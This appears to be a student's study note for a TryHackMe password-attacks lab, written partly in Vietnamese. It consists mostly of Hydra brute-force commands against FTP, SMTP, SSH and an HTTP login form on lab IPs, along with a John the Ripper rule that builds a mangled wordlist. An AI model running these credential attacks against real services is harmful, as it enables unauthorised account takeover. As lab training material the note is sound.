
[[Generate Password]] | [[Hydra]] | [[Enumeration & BruteForce (lab)]] 

## Landing page

![[Screenshot 2025-08-06 at 16.31.53.png]]

![[Screenshot 2025-08-06 at 16.33.06.png]]

```FTP
hydra -l ftp -P passlist.txt ftp://10.10.x.x
```

![[Screenshot 2025-08-06 at 16.36.52.png]]

```SMTP
hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v
```

![[Screenshot 2025-08-06 at 16.44.09.png]]

![[Screenshot 2025-08-06 at 16.53.18.png]]

```ssh
hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
```

Và tạo username list 

```python
python3 username_generator.py -w users.lst
```

![[Screenshot 2025-08-06 at 16.58.44.png]]

```HTTP
hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
```

Tạo rule THM-Password-Attack để sử dụng

```Ter
user@machine$ sudo vi /etc/john/john.conf [List.Rules:THM-Password-Attacks] Az"[0-9]" ^[!@#$]
```

Sau đó tạo list Password đã qua rule 

```John
john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > clinic-rules.ls
```

Và sử dụng hydra để quét cạn password bằng list đã tạo qua rule bằng john 

```Hydra 
hydra -l pittman@clinic.thmredteam.com -P clinic-rules.lst smtps://10.201.39.78
```

---


![[Screenshot 2025-08-06 at 18.46.09.png]]![[Screenshot 2025-08-06 at 18.48.57.png]]